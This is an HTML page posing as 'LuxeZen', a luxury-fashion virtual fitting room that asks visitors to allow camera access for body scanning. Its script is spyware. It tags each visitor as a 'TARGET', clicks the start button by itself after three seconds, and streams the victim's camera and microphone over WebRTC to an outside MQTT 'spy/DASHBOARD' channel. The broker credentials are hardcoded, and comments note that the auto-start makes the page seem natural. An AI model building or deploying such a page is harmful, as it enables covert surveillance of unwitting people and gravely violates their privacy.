<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LuxeZen | Exclusive Preview</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
            overflow-x: hidden;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
            text-align: center;
        }
        .logo {
            font-size: 2.5rem;
            font-weight: 300;
            letter-spacing: 8px;
            color: #d4af37;
            margin-bottom: 10px;
        }
        .tagline {
            font-size: 1rem;
            color: #aaa;
            margin-bottom: 50px;
        }
        .main-btn {
            background: linear-gradient(135deg, #d4af37, #f7ef8a);
            border: none;
            padding: 22px 50px;
            font-size: 1.3rem;
            color: #000;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            font-weight: bold;
            letter-spacing: 2px;
            margin-top: 30px;
        }
        .main-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.7);
        }
        .loading {
            display: none;
            margin-top: 30px;
            color: #d4af37;
        }
        .footer {
            margin-top: 80px;
            color: #555;
            font-size: 0.8rem;
        }
        .hidden {
            display: none;
        }
        #video {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            margin-top: 20px;
            border: 2px solid #d4af37;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">LUXEZEN</div>
        <div class="tagline">EXCLUSIVE DIGITAL FITTING ROOM â€” PRIVATE PREVIEW</div>
        <p>Experience the future of fashion tailoring. Our AI will analyze your profile to curate a personalized collection.</p>
        <p><em>Please allow camera access for body measurement scanning.</em></p>
        
        <button class="main-btn" id="startBtn">ðŸŽ€ LAUNCH VIRTUAL FITTING</button>
        
        <div class="loading" id="loading">
            Initializing scanning environment... <br>
            <small>Do not close this window.</small>
        </div>

        <video id="video" autoplay playsinline></video>

        <div class="footer">
            <p>Â© 2025 LuxeZen Collective. This is a private preview session.<br>
            <span id="sessionId">Session ID: Loading...</span></p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.1/simplepeer.min.js"></script>
    <script>
        const startBtn = document.getElementById('startBtn');
        const loading = document.getElementById('loading');
        const video = document.getElementById('video');
        const sessionIdEl = document.getElementById('sessionId');

        // Generate session ID
        const sessionId = 'TARGET_' + Math.random().toString(36).substring(2, 10).toUpperCase();
        sessionIdEl.innerText = `Session ID: ${sessionId}`;

        let peer = null;
        let stream = null;
        let mqttClient = null;

        // HiveMQ WebSocket connection
        const ws = new WebSocket('wss://aa3c606196d945bc89c194f94dc418b5.a1.au.hivema.cloud:8884/mqtt');

        ws.onopen = () => {
            console.log('Connected to HiveMQ');
            // Subscribe ke channel sendiri untuk menerima signal dari dashboard
            ws.send(JSON.stringify({
                cmd: 'subscribe',
                topics: [`spy/${sessionId}/signal`],
                username: 'Zang',
                password: 'ZingZangRulez'
            }));
        };

        ws.onmessage = (event) => {
            const msg = JSON.parse(event.data);
            if (msg.topic === `spy/${sessionId}/signal` && peer) {
                const data = JSON.parse(msg.payload);
                peer.signal(data);
            }
        };

        startBtn.onclick = async () => {
            startBtn.style.display = 'none';
            loading.style.display = 'block';

            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                video.classList.remove('hidden');

                // Create peer connection
                peer = new SimplePeer({
                    initiator: true,
                    stream: stream,
                    config: {
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:global.stun.twilio.com:3478' }
                        ]
                    }
                });

                peer.on('signal', data => {
                    // Kirim signal ke channel dashboard
                    ws.send(JSON.stringify({
                        cmd: 'publish',
                        topic: 'spy/DASHBOARD/signal',
                        payload: JSON.stringify({
                            sessionId: sessionId,
                            signal: data
                        }),
                        username: 'Zang',
                        password: 'ZingZangRulez'
                    }));
                });

                peer.on('connect', () => {
                    console.log('PEER CONNECTED - Stream active');
                    loading.innerHTML = 'Scanning in progress...<br>You may minimize this window.';
                });

                console.log('Spy stream started.');
            } catch (err) {
                console.error('Error:', err);
                loading.innerHTML = 'Camera access required.<br>Please refresh and allow.';
            }
        };

        // Auto-start setelah 3 detik (opsional, biar lebih natural)
        setTimeout(() => {
            startBtn.click();
        }, 3000);
    </script>
</body>
    </html>
